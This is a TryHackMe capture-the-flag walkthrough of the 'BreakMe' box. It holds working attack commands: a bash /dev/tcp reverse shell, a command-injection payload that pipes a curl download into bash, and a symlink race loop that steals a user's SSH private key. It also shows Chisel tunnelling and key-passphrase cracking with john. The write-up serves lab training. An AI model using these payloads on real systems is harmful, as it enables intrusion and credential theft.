@@ -1,0 +1,161 @@
+BreakMe – TryHackMe Walkthrough
+
+Enumeration:
+
+Started with nmap scan, found HTTP and SSH open.
+
+nmap -sC -sV 10.10.158.39 -T4
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-23 16:30 CET
+Nmap scan report for 10.10.158.39
+Host is up (0.081s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 (RSA)
+|   256 a3:9c:66:73:fc:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a (ECDSA)
+|_  256 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb (ED25519)
+80/tcp open  http    Apache httpd 2.4.56 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.56 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.60 seconds
+
+Browsing the site revealed a WordPress installation.
+
+Used wpscan to enumerate users, discovered admin and bob.
+
+Foothold:
+
+WordPress was running an outdated plugin.
+
+After some trial and error (and a lot of frustration with dead ends), I found a CVE that allowed privilege escalation inside WordPress.
+
+Leveraged this to grant bob admin privileges.
+
+Shell Access:
+
+Uploaded a PHP reverse shell via the plugin editor.
+
+Got a foothold as www-data.
+
+Privilege Escalation:
+
+After looking for a while we couldn’t find anything interesting as www-data only an internal open port at 9999.
+
+So we decided to port forward that using Chisel. Setting up a python web server to send it to the box we were able to forward that port into our machine.
+
+On the attacker machine:
+
+python3 -m http.server             
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.158.39 - - [23/Sep/2024 17:04:17] "GET /chisel HTTP/1.1" 200 -
+                                                                                                                  
+┌──(kali㉿root)-[~/Desktop/TryHackMe/breakme]
+└─$ ./chisel server -p 9005 --reverse &
+[1] 9211
+                                                                                                                  
+2024/09/23 17:06:57 server: Reverse tunnelling enabled
+2024/09/23 17:06:57 server: Fingerprint rVpum+FgFJfUDMUO19spP4rhonxrISMZ/nlrbPQ599A=
+2024/09/23 17:06:57 server: Listening on http://0.0.0.0:9005
+
+On the target machine:
+
+www-data@Breakme:/$ cd /tmp
+cd /tmp
+www-data@Breakme:/tmp$ wget http://10.9.3.146:8000/chisel
+wget http://10.9.3.146:8000/chisel
+--2024-09-23 12:04:17--  http://10.9.3.146:8000/chisel
+Connecting to 10.9.3.146:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8945816 (8.5M) [application/octet-stream]
+Saving to: ‘chisel’
+
+chisel              100%[===================>]   8.53M  1.21MB/s    in 10s     
+
+2024-09-23 12:04:27 (874 KB/s) - ‘chisel’ saved [8945816/8945816]
+
+www-data@Breakme:/tmp$ chmod +x chisel
+chmod +x chisel
+www-data@Breakme:/tmp$ ./chisel client 10.9.3.146:9005 R:9999:127.0.0.1:9999 &
+./chisel client 10.9.3.146:9005 R:9999:127.0.0.1:9999 &
+[1] 1213
+www-data@Breakme:/tmp$ 2024/09/23 12:06:56 client: Connecting to ws://10.9.3.146:9005
+
+2024/09/23 12:06:58 client: Connected (Latency 70.356073ms)
+
+Checking http://127.0.0.1:9999/ we get a basic web app where we can Check a Target (alive or not), Check a User and Check for a File.
+
+First thing we need to do is to create a bash reverse shell file and host it on a python web server.
+
+#!/bin/bash
+sh -i >& /dev/tcp/[Your IP]/9001 0>&1
+
+Setting up a netcat listener on port 9001 and injecting our payload: |curl${IFS}http://10.9.3.146:8000/reverse.sh|bash will get us our reverse shel
+
+while true; do ln -sf /home/youcef/.ssh/id_rsa symlink; rm symlink; touch symlink; done &
+
+We now need to execute the readfile binary over and over again until we capture the private key using the following command.
+
+for i in {1..30}; do /home/youcef/readfile symlink; done
+
+Copying the public key into john’s authorized_keys we were able to gain a more stable shell through ssh.
+
+┌──(kali㉿root)-[~/Desktop/TryHackMe/breakme]
+└─$ nano id_rsa                                          
+                                                                                                          
+┌──(kali㉿root)-[~/Desktop/TryHackMe/breakme]
+└─$ chmod 700 id_rsa 
+                                                                                                                                                                                                         
+┌──(kali㉿root)-[~/Desktop/TryHackMe/breakme]
+└─$ ssh -i id_rsa youcef@10.10.158.39 
+Enter passphrase for key 'id_rsa': 
+youcef@10.10.158.39's password: 
+Permission denied, please try again.
+youcef@10.10.158.39's password: 
+                                                                                                     
+┌──(kali㉿root)-[~/Desktop/TryHackMe/breakme]
+└─$ ssh2john id_rsa > id_rsa.john    
+                                                                                                          
+┌──(kali㉿root)-[~/Desktop/TryHackMe/breakme]
+└─$ john id_rsa.john -wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+No password hashes left to crack (see FAQ)
+                                                                                                                            
+                                                                                                          
+┌──(kali㉿root)-[~/Desktop/TryHackMe/breakme]
+└─$ john id_rsa.john -show                                          
+id_rsa:[REDACTED]
+
+┌──(kali㉿root)-[~/Desktop/TryHackMe/breakme]
+└─$ ssh -i id_rsa youcef@10.10.158.39
+Enter passphrase for key 'id_rsa': 
+Linux Breakme 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Sep 23 14:29:19 2024 from 10.9.3.146
+youcef@Breakme:~$ ls .ssh
+authorized_keys  id_rsa  user2.txt
+youcef@Breakme:~$ 
+Privilege Escalation (Root)
+Once we’re on youcef’s account we checked for sudo permissions using sudo -l and we found a python script that we could run as root.
+
+youcef@Breakme:/home/john$ sudo -l
+Matching Defaults entries for youcef on breakme:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User youcef may run the following commands on breakme:
+    (root) NOPASSWD: /usr/bin/python3 /root/jail.py
+youcef@Breakme:/home/john$
+
+Root
+
+After persistence and careful enumeration, I managed to escalate privileges and capture the final flag.
